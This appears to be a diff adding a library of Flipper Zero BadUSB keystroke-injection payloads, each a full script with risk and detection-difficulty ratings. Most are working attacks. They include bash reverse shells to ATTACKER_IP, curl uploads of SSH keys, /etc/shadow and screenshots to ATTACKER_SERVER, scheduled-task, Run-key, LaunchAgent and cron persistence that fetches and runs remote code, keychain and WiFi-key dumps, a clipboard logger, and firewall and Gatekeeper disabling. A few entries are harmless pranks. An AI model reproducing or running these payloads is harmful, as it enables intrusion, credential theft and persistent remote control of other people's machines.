+STRING $out = @(); $out += "=== MAPPED DRIVES ==="; $out += (net use | Out-String); $out += "=== LOCAL SHARES ==="; $out += (net share | Out-String); $out += "=== NETWORK NEIGHBORS ==="; $subnet = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress -replace '\\d+$',''; 1..254 | ForEach-Object { $ip = "$subnet$_"; if(Test-Connection $ip -Count 1 -Quiet -TimeoutSeconds 1){ $shares = net view "\\\\$ip" 2>$null; if($shares){ $out += "=== $ip ==="; $out += ($shares | Out-String) }}}; $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; $outPath = if($drv){"$($drv):\\loot\\network_shares.txt"} else {"$env:TEMP\\network_shares.txt"}; $out | Out-File $outPath
+ENTER
+DELAY 10000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'flipper-clipboard-steal',
+    name: '[Flipper] Clipboard Stealer',
+    category: 'exfiltration',
+    description: 'Continuously monitors and logs clipboard contents to Flipper SD card using DEFAULT_DELAY and STRINGDELAY.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~5s',
+    detectionDifficulty: 'hard',
+    format: 'flipper',
+    script: `REM Flipper Zero Clipboard Stealer
+DEFAULT_DELAY 20
+STRINGDELAY 15
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $logFile = "$env:APPDATA\\cliplog.txt"; $last = ""; while($true){ $current = Get-Clipboard -Raw -ErrorAction SilentlyContinue; if($current -and $current -ne $last){ $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; "$ts`n$current`n---" | Out-File $logFile -Append; $last = $current }; Start-Sleep -Seconds 2 }
+ENTER`,
+    notes: 'Runs continuously logging clipboard changes. Kill powershell process to stop.'
+  },
+  {
+    id: 'flipper-usb-dropper',
+    name: '[Flipper] USB Autorun Payload Dropper',
+    category: 'persistence',
+    description: 'Drops a payload script and creates persistence via scheduled task. Uses HOLD/RELEASE for modifier keys.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~8s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero USB Payload Dropper
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $payloadDir = "C:\\Users\\Public\\Libraries"; New-Item -ItemType Directory -Force -Path $payloadDir | Out-Null; $payload = 'IEX(New-Object Net.WebClient).DownloadString("https://ATTACKER_SERVER/payload.ps1")'; $payload | Out-File "$payloadDir\\updater.ps1" -Encoding ASCII; $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $payloadDir\\updater.ps1"; $trigger = New-ScheduledTaskTrigger -AtLogon; Register-ScheduledTask -TaskName "WindowsLibraryUpdate" -Action $action -Trigger $trigger -Description "Windows Library Updater" -Force
+ENTER
+DELAY 3000
+STRING exit
+ENTER`,
+    notes: 'Replace ATTACKER_SERVER. Payload persists via scheduled task at logon.'
+  },
+  {
+    id: 'flipper-registry-persist',
+    name: '[Flipper] Registry Persistence',
+    category: 'persistence',
+    description: 'Adds a registry Run key for persistence and drops a beacon script. Uses Flipper-specific STRINGDELAY for reliability.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~6s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    script: `REM Flipper Zero Registry Persistence
+DEFAULT_DELAY 20
+STRING_DELAY 15
+WAIT_FOR_BUTTON_PRESS
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $script = '$w=New-Object Net.WebClient;while($true){try{IEX($w.DownloadString("https://ATTACKER_SERVER/beacon"))}catch{};Start-Sleep 300}'; $script | Out-File "C:\\Users\\Public\\updchk.ps1" -Encoding ASCII; New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "UpdateCheck" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\updchk.ps1" -PropertyType String -Force
+ENTER
+DELAY 2000
+STRING exit
+ENTER`,
+    notes: 'Replace ATTACKER_SERVER. Beacon checks in every 5 minutes.'
+  },
+
+  // macOS Flipper payloads
+  {
+    id: 'flipper-mac-revshell',
+    name: '[Flipper] macOS Terminal Reverse Shell',
+    category: 'reverse-shells',
+    description: 'Opens Terminal on macOS and establishes a reverse shell. Uses WAIT_FOR_BUTTON_PRESS for timing.',
+    targetOS: ['macos'],
+    riskLevel: 'critical',
+    executionTime: '~6s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero macOS Reverse Shell
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+GUI SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1500
+STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
+ENTER
+DELAY 500
+STRING disown && exit
+ENTER`,
+    notes: 'Replace ATTACKER_IP. Uses Spotlight to launch Terminal.'
+  },
+  {
+    id: 'flipper-mac-sshkey-exfil',
+    name: '[Flipper] macOS SSH Key Exfiltration',
+    category: 'credentials',
+    description: 'Copies SSH keys from the macOS user .ssh directory and uploads them or stages for retrieval.',
+    targetOS: ['macos'],
+    riskLevel: 'high',
+    executionTime: '~8s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero macOS SSH Key Exfiltration
+DEFAULT_DELAY 20
+DELAY 1000
+GUI SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1500
+STRING mkdir -p /tmp/.loot && cp -r ~/.ssh/* /tmp/.loot/ 2>/dev/null; ls -la /tmp/.loot/ > /tmp/.loot/inventory.txt; curl -X POST -F "files=@/tmp/.loot/id_rsa" -F "files=@/tmp/.loot/id_ed25519" https://ATTACKER_SERVER/upload 2>/dev/null; exit
+ENTER`,
+    notes: 'Replace ATTACKER_SERVER. Attempts to upload common key types.'
+  },
+  {
+    id: 'flipper-mac-keychain',
+    name: '[Flipper] macOS Keychain Dump',
+    category: 'credentials',
+    description: 'Dumps keychain items including passwords and certificates from the macOS login keychain.',
+    targetOS: ['macos'],
+    riskLevel: 'critical',
+    executionTime: '~10s',
+    detectionDifficulty: 'hard',
+    format: 'flipper',
+    script: `REM Flipper Zero macOS Keychain Dump
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+GUI SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1500
+STRING security dump-keychain -d ~/Library/Keychains/login.keychain-db > /tmp/.keychain_dump.txt 2>&1; security find-generic-password -ga "Wi-Fi" 2>&1 | grep password >> /tmp/.keychain_dump.txt; exit
+ENTER`,
+    notes: 'May prompt for user password on macOS. Security prompts cannot be bypassed.'
+  },
+  {
+    id: 'flipper-mac-screenshot',
+    name: '[Flipper] macOS Screenshot Capture',
+    category: 'exfiltration',
+    description: 'Takes a screenshot on macOS and stages it for exfiltration via curl.',
+    targetOS: ['macos'],
+    riskLevel: 'medium',
+    executionTime: '~6s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero macOS Screenshot
+DEFAULT_DELAY 20
+DELAY 1000
+GUI SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1500
+STRING screencapture -x /tmp/.ss_$(date +%s).png && curl -X POST -F "file=@$(ls -t /tmp/.ss_* | head -1)" https://ATTACKER_SERVER/upload 2>/dev/null; rm /tmp/.ss_*; exit
+ENTER`,
+    notes: 'Replace ATTACKER_SERVER. The -x flag suppresses the shutter sound.'
+  },
+  {
+    id: 'flipper-mac-launchagent',
+    name: '[Flipper] macOS LaunchAgent Persistence',
+    category: 'persistence',
+    description: 'Creates a macOS LaunchAgent for persistent reverse shell access. Uses STRINGDELAY for reliable typing.',
+    targetOS: ['macos'],
+    riskLevel: 'high',
+    executionTime: '~10s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero macOS LaunchAgent Persistence
+DEFAULT_DELAY 20
+STRINGDELAY 15
+DELAY 1000
+GUI SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1500
+STRING mkdir -p ~/Library/LaunchAgents && cat > ~/Library/LaunchAgents/com.apple.updatecheck.plist << 'PEOF'
+ENTER
+STRING <?xml version="1.0" encoding="UTF-8"?>
+ENTER
+STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+ENTER
+STRING <plist version="1.0"><dict><key>Label</key><string>com.apple.updatecheck</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>600</integer></dict></plist>
+ENTER
+STRING PEOF
+ENTER
+DELAY 500
+STRING launchctl load ~/Library/LaunchAgents/com.apple.updatecheck.plist && exit
+ENTER`,
+    notes: 'Replace ATTACKER_IP. Reconnects every 10 minutes.'
+  },
+  {
+    id: 'flipper-mac-disable-gatekeeper',
+    name: '[Flipper] Disable macOS Gatekeeper',
+    category: 'evasion',
+    description: 'Disables macOS Gatekeeper to allow unsigned applications to run without warnings.',
+    targetOS: ['macos'],
+    riskLevel: 'high',
+    executionTime: '~6s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    script: `REM Flipper Zero Disable macOS Gatekeeper
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+GUI SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1500
+STRING sudo spctl --master-disable
+ENTER
+DELAY 2000
+REM User password may be required here
+STRING sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO
+ENTER
+DELAY 1000
+STRING exit
+ENTER`,
+    notes: 'Requires sudo password. Disables Gatekeeper and prevents auto-rearm.'
+  },
+
+  // Linux Flipper payloads
+  {
+    id: 'flipper-linux-revshell',
+    name: '[Flipper] Linux Bash Reverse Shell',
+    category: 'reverse-shells',
+    description: 'Opens a terminal on Linux and establishes a bash reverse shell. Uses WAIT_FOR_BUTTON_PRESS.',
+    targetOS: ['linux'],
+    riskLevel: 'critical',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero Linux Reverse Shell
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+HOLD CTRL ALT
+DELAY 100
+STRING t
+RELEASE CTRL ALT
+DELAY 1500
+STRING nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
+ENTER
+DELAY 500
+STRING disown && exit
+ENTER`,
+    notes: 'Replace ATTACKER_IP. Uses HOLD/RELEASE for Ctrl+Alt+T terminal shortcut.'
+  },
+  {
+    id: 'flipper-linux-shadow',
+    name: '[Flipper] Linux /etc/shadow Copy',
+    category: 'credentials',
+    description: 'Copies /etc/shadow file for offline password cracking. Requires root or sudo access.',
+    targetOS: ['linux'],
+    riskLevel: 'critical',
+    executionTime: '~6s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero /etc/shadow Exfiltration
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+HOLD CTRL ALT
+DELAY 100
+STRING t
+RELEASE CTRL ALT
+DELAY 1500
+STRING sudo cp /etc/shadow /tmp/.shadow_dump && sudo cp /etc/passwd /tmp/.passwd_dump && sudo chmod 644 /tmp/.shadow_dump /tmp/.passwd_dump && curl -X POST -F "shadow=@/tmp/.shadow_dump" -F "passwd=@/tmp/.passwd_dump" https://ATTACKER_SERVER/upload 2>/dev/null; rm /tmp/.shadow_dump /tmp/.passwd_dump; exit
+ENTER`,
+    notes: 'Replace ATTACKER_SERVER. Requires sudo. Crack with hashcat or john.'
+  },
+  {
+    id: 'flipper-linux-sshkeys',
+    name: '[Flipper] Linux SSH Authorized Keys Injection',
+    category: 'persistence',
+    description: 'Injects an attacker SSH public key into authorized_keys for persistent SSH access.',
+    targetOS: ['linux'],
+    riskLevel: 'high',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero SSH Key Injection
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+HOLD CTRL ALT
+DELAY 100
+STRING t
+RELEASE CTRL ALT
+DELAY 1500
+STRING mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo "ssh-rsa AAAA_ATTACKER_PUBLIC_KEY_HERE attacker@c2" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && exit
+ENTER`,
+    notes: 'Replace AAAA_ATTACKER_PUBLIC_KEY_HERE with your actual public key.'
+  },
+  {
+    id: 'flipper-linux-crontab',
+    name: '[Flipper] Linux Crontab Persistence',
+    category: 'persistence',
+    description: 'Adds a cron job for persistent reverse shell access every 5 minutes.',
+    targetOS: ['linux'],
+    riskLevel: 'high',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero Linux Crontab Persistence
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+HOLD CTRL ALT
+DELAY 100
+STRING t
+RELEASE CTRL ALT
+DELAY 1500
+STRING (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab - && echo "Persistence installed" && exit
+ENTER`,
+    notes: 'Replace ATTACKER_IP. Visible via crontab -l.'
+  },
+  {
+    id: 'flipper-linux-iptables',
+    name: '[Flipper] Linux iptables Disable',
+    category: 'network',
+    description: 'Flushes all iptables rules to disable the firewall. Uses HOLD/RELEASE for terminal shortcut.',
+    targetOS: ['linux'],
+    riskLevel: 'critical',
+    executionTime: '~5s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    script: `REM Flipper Zero Linux iptables Disable
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+HOLD CTRL ALT
+DELAY 100
+STRING t
+RELEASE CTRL ALT
+DELAY 1500
+STRING sudo iptables -F && sudo iptables -X && sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT && sudo iptables -P OUTPUT ACCEPT && echo "Firewall disabled" && exit
+ENTER`,
+    notes: 'Requires sudo. Flushes all chains and sets default ACCEPT policy.'
+  },
+
+  // Cross-platform / Fun Flipper payloads
+  {
+    id: 'flipper-rickroll',
+    name: '[Flipper] Rick Roll',
+    category: 'pranks',
+    description: 'Opens the classic Rick Astley video in the default browser. Uses Flipper-specific DEFAULT_DELAY for smooth execution.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~3s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    script: `REM Flipper Zero Rick Roll
+DEFAULT_DELAY 100
+DELAY 500
+GUI r
+DELAY 500
+STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ENTER`,
+    notes: 'Classic. Simple. Effective.'
+  },
+  {
+    id: 'flipper-fake-update',
+    name: '[Flipper] Fake Windows Update Screen',
+    category: 'pranks',
+    description: 'Opens a full-screen fake Windows Update page in the browser. Uses REPEAT for key presses.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~5s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    script: `REM Flipper Zero Fake Windows Update
+DEFAULT_DELAY 20
+DELAY 500
+GUI r
+DELAY 500
+STRING https://fakeupdate.net/win10u/
+ENTER
+DELAY 2000
+REM Go fullscreen
+F11
+DELAY 500`,
+    notes: 'Press F11 or Escape to exit fullscreen. Harmless prank.'
+  },
+  {
+    id: 'flipper-wallpaper-change',
+    name: '[Flipper] Desktop Wallpaper Changer',
+    category: 'pranks',
+    description: 'Downloads a funny image and sets it as the desktop wallpaper. Uses STRINGDELAY for reliable typing.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~8s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    script: `REM Flipper Zero Wallpaper Changer
+DEFAULT_DELAY 20
+STRINGDELAY 15
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest -Uri "https://i.imgur.com/example.jpg" -OutFile "$env:TEMP\\flipper_wp.jpg"; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class WP{[DllImport("user32.dll",CharSet=CharSet.Auto)]static extern int SystemParametersInfo(int a,int b,string c,int d);public static void Set(string p){SystemParametersInfo(20,0,p,3);}}'; [WP]::Set("$env:TEMP\\flipper_wp.jpg")
+ENTER
+DELAY 3000
+STRING exit
+ENTER`,
+    notes: 'Replace image URL with desired wallpaper.'
+  },
+  {
+    id: 'flipper-button-demo',
+    name: '[Flipper] WAIT_FOR_BUTTON_PRESS Demo',
+    category: 'pranks',
+    description: 'Interactive demo showcasing WAIT_FOR_BUTTON_PRESS - opens notepad and types a message each time the Flipper button is pressed.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~20s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    script: `REM Flipper Zero Button Press Demo
+REM Each section waits for a button press
+DEFAULT_DELAY 50
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 1000
+
+REM First message
+WAIT_FOR_BUTTON_PRESS
+STRING === Flipper Zero BadUSB Demo ===
+ENTER
+STRING Press the Flipper button to continue...
+ENTER
+ENTER
+
+REM Second message
+WAIT_FOR_BUTTON_PRESS
+STRING Step 1: I can type text on demand!
+ENTER
+STRING Each section waits for YOUR button press.
+ENTER
+ENTER
+
+REM Third message
+WAIT_FOR_BUTTON_PRESS
+STRING Step 2: This gives you precise timing control.
+ENTER
+STRING No more hoping the script runs at the right moment.
+ENTER
+ENTER
+
+REM Final message
+WAIT_FOR_BUTTON_PRESS
+STRING Step 3: Demo complete! This is the power of Flipper Zero BadUSB.
+ENTER
+STRING Interactive payloads > timed payloads
+ENTER`,
+    notes: 'Great for demonstrations. Each section is triggered by pressing the Flipper button.'
+  },
+  {
+    id: 'flipper-win-exfil-compress',
+    name: '[Flipper] Windows Compressed Exfil',
+    category: 'exfiltration',
+    description: 'Compresses documents, downloads, and desktop files into a ZIP and stages for Flipper SD retrieval.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~20s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero Compressed Exfiltration
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $staging = "$env:TEMP\\fz_exfil"; New-Item -ItemType Directory -Force -Path $staging | Out-Null; $exts = @("*.doc","*.docx","*.pdf","*.xlsx","*.txt","*.csv","*.pptx","*.key","*.pem","*.conf","*.cfg"); foreach($ext in $exts){ Get-ChildItem -Path "$env:USERPROFILE\\Desktop","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Downloads" -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 5MB -and $_.LastWriteTime -gt (Get-Date).AddDays(-14) } | ForEach-Object { Copy-Item $_.FullName "$staging\\$($_.Name)" -Force }}; Compress-Archive -Path "$staging\\*" -DestinationPath "$env:TEMP\\loot.zip" -Force; $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; if($drv){ Copy-Item "$env:TEMP\\loot.zip" "$($drv):\\loot\\exfil.zip" -Force }
+ENTER
+DELAY 10000
+STRING exit
+ENTER`,
+    notes: 'Collects files < 5MB modified in last 14 days. Saves to Flipper SD if available.'
+  },
+  {
+    id: 'flipper-win-wifi-evil-twin',
+    name: '[Flipper] WiFi Evil Twin Prep',
+    category: 'network',
+    description: 'Gathers WiFi network details to prepare for an evil twin attack. Exports profiles and connection info.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~8s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero WiFi Evil Twin Preparation
+DEFAULT_DELAY 20
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /k
+ENTER
+DELAY 800
+STRING netsh wlan show profiles > %TEMP%\\wifi_profiles.txt
+ENTER
+DELAY 1000
+STRING netsh wlan show interfaces >> %TEMP%\\wifi_profiles.txt
+ENTER
+DELAY 500
+STRING netsh wlan export profile key=clear folder=%TEMP%\\wifi_export
+ENTER
+DELAY 2000
+STRING exit
+ENTER`
   }
 ]
